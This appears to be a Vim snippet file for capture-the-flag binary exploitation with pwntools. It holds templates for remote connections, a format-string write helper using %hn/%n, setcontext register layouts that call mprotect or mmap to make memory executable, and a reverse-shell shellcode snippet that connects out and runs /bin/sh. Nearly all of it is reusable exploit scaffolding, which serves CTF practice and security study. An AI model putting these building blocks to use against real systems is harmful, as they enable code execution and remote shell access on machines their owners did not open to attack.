snippet pwn "ctf pwn challenge"
#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('${1:`find $PWD -type f -name $(basename $PWD)`}'); context.arch = elf.arch
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

r = remote(HOST, PORT)

r.interactive()
endsnippet

snippet conn
#!/usr/bin/env python
from pwn import *
HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)

r = remote(HOST, PORT)
r.interactive()
endsnippet

snippet sla
r.sendlineafter('${1:> }', '${2}')
endsnippet

snippet p
pause()
endsnippet

snippet func
def ${1:func}(${4:data}):
    r.sendlineafter('${2}', '${3}')
    r.sendlineafter('$2', $4)

endsnippet

snippet info
log.info('${1}: {}'.format(hex($1)))
endsnippet

snippet base
log.info('${1}_base: {}'.format(hex($1_base)))
endsnippet

snippet fmtchar
def fmtchar(prev, word, idx, byte = 1):
    typ = {0: '$p', 1: '$hhn', 2: '$hn', 4: '$n'}
    cnt = word - prev if word - prev >= 0 else 256**byte - prev + word
    pad = '' if word == prev else '%{}c'.format(cnt)
    return '{}%{}{}'.format(pad, idx, typ[byte])
endsnippet

snippet z3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from z3 import *

x = [BitVec("x_%d" % i, 8) for i in range(32)]

s = Solver()
s.add()

assert s.check() == sat

m = s.model()
print "".join([chr(m[x[i]].as_long()) for i in range(32)])
endsnippet

snippet setcontext_mprotect
# mprotect(addr, length, RWX)
ret = libc_base + 0x`objdump -d -M intel /lib/x86_64-linux-gnu/libc.so.6 | grep -m1 'ret' | awk -F':' '{print $1}' | tr -d ' '`
sc_page = sc_addr & 0xffffffffffff000
setcontext_args = flat(
    'a'*0x28,                      # padding
    0, 0, 0, 0, 0, 0, 0, 0,        # r8, r9, x, x, r12, r13, r14, r15
    sc_page, 0x1000, 0, 0, 7, 0,   # rdi, rsi, rbp, rbx, rdx, x
    0, rop_addr, ret,              # rcx, rsp, rip
)
endsnippet

snippet setcontext_mmap
# mmap(addr, length, RWX, flags=rcx, fd=r8, offset=r9)
ret = libc_base + 0x`objdump -d -M intel /lib/x86_64-linux-gnu/libc.so.6 | grep -m1 'ret' | awk -F':' '{print $1}' | tr -d ' '`
sc_page = sc_addr & 0xffffffffffff000
setcontext_args = flat(
    'a'*0x28,                      # padding
    0, 0, 0, 0, 0, 0, 0, 0,        # r8, r9, x, x, r12, r13, r14, r15
    sc_page, 0x1000, 0, 0, 7, 0,   # rdi, rsi, rbp, rbx, rdx, x
    0x22, rop_addr, ret,           # rcx, rsp, rip
)
endsnippet

snippet reverse_sc
context.arch = 'amd64'
sc = asm(
    shellcraft.connect(${1:'localhost'}, ${2:1234}) +
    'push rbp; pop rdi; xor esi, esi; push SYS_dup2; pop rax; syscall;' +
    'push rbp; pop rdi; push 1; pop rsi; push SYS_dup2; pop rax; syscall;' +
    'push rbp; pop rdi; push 2; pop rsi; push SYS_dup2; pop rax; syscall;' +
    shellcraft.execve('/bin/sh')
)
endsnippet
